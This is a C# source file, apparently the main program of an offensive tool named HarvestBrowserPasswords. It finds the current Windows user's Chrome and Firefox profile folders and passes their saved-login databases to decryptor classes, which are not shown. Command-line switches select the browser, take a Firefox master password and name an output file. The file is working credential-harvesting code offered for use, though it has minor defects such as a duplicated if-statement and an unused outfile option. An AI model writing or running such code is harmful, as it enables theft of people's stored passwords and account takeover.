using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Security.Principal;
using System.Text;
using System.IO;
using CommandLine;

namespace HarvestBrowserPasswords
{
    class Program
    {
        class Options
        {
            [Option('c', "chrome", HelpText = "Locate and attempt decryption of Google Chrome logins")]
            public bool Chrome { get; set; }

            [Option('f', "firefox", HelpText = "Locate and attempt decryption of Mozilla Firefox logins")]
            public bool Firefox { get; set; }

            [Option('a', "all", HelpText = "Locate and attempt decryption of Google Chrome and Mozilla Firefox logins")]
            public bool All { get; set; }

            [Option('p', "password", HelpText = "Master password for Mozilla Firefox Logins")]
            public string Password { get; set; }

            [Option('o', "outfile", HelpText = "write output to csv file")]
            public string Outfile { get; set; }

            public Options()
            {
                Chrome = false;
                Firefox = false;
                All = false;
                Password = "";
                Outfile = "";
            }
            
        }
        
        static void Main(string[] args)
        {
            //Get username of current user account
            string userAccountName = GetCurrentUser();

            Options opts = new Options();

            var result = Parser.Default.ParseArguments<Options>(args)
                .WithParsed(parsed => opts = parsed)
                .WithNotParsed(errors => Console.WriteLine($"Not parsed: {errors}"));

            if (opts.All)
            {
                GetChromePasswords(userAccountName);
                GetFirefoxPasswords(userAccountName);
            }
            else if (opts.Chrome)
            {
                GetChromePasswords(userAccountName);
            }
            else if (opts.Firefox)
            {
                if (opts.Password.Equals(null))
                {
                    GetFirefoxPasswords(userAccountName);
                }
                else
                {
                    GetFirefoxPasswords(userAccountName, opts.Password);
                }
                
            }
        }

        //Check if currently running in administrator context
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
      
        public static void GetChromePasswords(string userAccountName)
        {
            List<string> chromeProfiles = FindChromeProfiles(userAccountName);

            foreach (string chromeProfile in chromeProfiles)
            {
                string loginDataFile = chromeProfile + @"\Login Data";
                if (File.Exists(loginDataFile))
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[+] Found Chrome credential database for user: {userAccountName}");
                    new ChromeDatabaseDecryptor(loginDataFile);
                }
            }
        }

        public static List<string> FindChromeProfiles(string userAccountName)
        {
            string chromeDirectory = $"C:\\Users\\{userAccountName}\\AppData\\Local\\Google\\Chrome\\User Data";
            List<string> profileDirectories = new List<string>();

            foreach (string directory in profileDirectories)
            {
                Console.WriteLine(directory);
            }

            if (Directory.Exists(chromeDirectory))
            if (Directory.Exists(chromeDirectory))
            {
                //Add default profile location once existence of chrome directory is confirmed
                profileDirectories.Add(chromeDirectory + "\\Default");
                foreach (string directory in Directory.GetDirectories(chromeDirectory))
                {
                    if (directory.Contains("Profile "))
                    {
                        profileDirectories.Add(directory);
                        Console.WriteLine($"[+] Found Chrome Profile at {directory}");
                    }
                }
            }
            return profileDirectories;
        }

        public static void GetFirefoxPasswords(string userAccountName)
        {
            string masterPassword = "";

            foreach (string profile in FindFirefoxProfiles(userAccountName))
            {
                FirefoxDatabaseDecryptor decryptor = new FirefoxDatabaseDecryptor(profile, masterPassword);
            }
        }

        //Overload for case where master password is set
        public static void GetFirefoxPasswords(string userAccountName, string masterPassword)
        {
            foreach (string profile in FindFirefoxProfiles(userAccountName))
            {
                FirefoxDatabaseDecryptor decryptor = new FirefoxDatabaseDecryptor(profile, masterPassword);
            }
        }

        public static List<string> FindFirefoxProfiles(string userAccountName)
        {

            //List to store profile directories
            List<string> profileDirectories = new List<string>();

            //Roaming directory contains most firefox artifacts apart from cache
            string roamingDir = $"C:\\Users\\{userAccountName}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";

            //Check roaming profile
            if (Directory.Exists(roamingDir))
            {

                string[] roamingProfiles = Directory.GetDirectories(roamingDir);
                foreach (string directory in roamingProfiles)
                {
                    profileDirectories.Add(directory);
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[+] Found Firefox Profile at {directory}");
                    Console.ResetColor();
                }
            }

            return profileDirectories;
        }

        public static string GetCurrentUser()
        {
            //Get username for currently running account (SamCompatible Enum format)
            string userAccountSamCompatible = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            
            //Remove domain and backslashes from name
            int index = userAccountSamCompatible.IndexOf("\\", 0, userAccountSamCompatible.Length) + 1;
            string userAccountName = userAccountSamCompatible.Substring(index);

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"[*] Running As: {userAccountSamCompatible}");
            Console.ResetColor();

            return userAccountName;
        }
    }  
}
